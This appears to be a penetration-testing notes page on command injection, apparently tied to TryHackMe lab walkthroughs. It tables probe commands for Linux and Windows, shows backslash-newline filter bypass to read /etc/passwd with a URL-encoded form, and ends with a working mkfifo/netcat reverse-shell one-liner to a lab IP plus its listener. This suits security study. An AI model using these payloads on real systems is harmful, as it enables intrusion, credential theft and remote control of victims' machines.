# Command Injection

## Useful payloads

### **Linux**

| Payload | Description                                                                                                                                                                                                          |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| whoami  | See what user the application is running under.                                                                                                                                                                      |
| ls      | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.                               |
| ping    | This command will invoke the application to hang. This will be useful in testing an application for blind command injection.                                                                                         |
| sleep   | This is another useful payload in testing an application for blind command injection, where the machine does not have `ping` installed.                                                                              |
| nc      | Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges. |

### Windows

| Payload | Description                                                                                                                                                                            |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| whoami  | See what user the application is running under.                                                                                                                                        |
| dir     | List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things. |
| ping    | This command will invoke the application to hang. This will be useful in testing an application for blind command injection.                                                           |
| timeout | This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed.                |



## Filter Bypass

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)&#x20;



### Bypass with backslash newline

**Examples**

[chill-hack.md](../../walkthroughs/tryhackme/chill-hack.md "mention")

Commands can be broken into parts by using backslash followed by a newline

```
$ cat /et\
c/pa\
sswd
```

URL encoded form would look like this:

```
cat%20/et%5C%0Ac/pa%5C%0Asswd
```



**Web**

```
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.172.186 1337 >/tmp/f
```

**Kali**

```
nc -lvnp 1337
```



